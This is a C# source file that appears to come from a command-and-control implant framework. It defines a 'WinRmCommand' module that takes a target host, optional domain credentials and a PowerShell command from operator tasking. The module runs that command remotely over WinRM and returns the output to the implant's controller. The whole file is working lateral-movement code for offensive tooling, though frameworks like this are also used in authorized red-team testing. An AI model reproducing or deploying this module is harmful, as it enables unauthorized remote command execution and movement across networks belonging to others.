using System;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Threading;
using System.Threading.Tasks;

namespace Drone.Commands;

public sealed class WinRmCommand : DroneCommand
{
    public override byte Command => 0x5C;
    public override bool Threaded => false;
    
    public override async Task Execute(DroneTask task, CancellationToken cancellationToken)
    {
        var uri = new Uri($"http://{task.Arguments["target"]}:5985/wsman");

        WSManConnectionInfo conn = null;

        if (task.Arguments.TryGetValue("domain", out var domain))
        {
            if (task.Arguments.TryGetValue("username", out var username))
            {
                if (task.Arguments.TryGetValue("password", out var plaintext))
                {
                    var credential = new PSCredential($"{domain}\\{username}", plaintext.ToSecureString());
                    conn = new WSManConnectionInfo(uri, "http://schemas.microsoft.com/powershell/Microsoft.PowerShell", credential);
                }
            }
        }

        conn ??= new WSManConnectionInfo(uri);

        using var rs = RunspaceFactory.CreateRunspace(conn);
        rs.Open();

        using var posh = System.Management.Automation.PowerShell.Create();
        posh.Runspace = rs;
        posh.AddScript(task.Arguments["command"]);
        
        var results = posh.Invoke();
        var output = string.Join(Environment.NewLine, results.Select(o => o.ToString()).ToArray());

        await Drone.SendTaskOutput(task.Id, output);
    }
}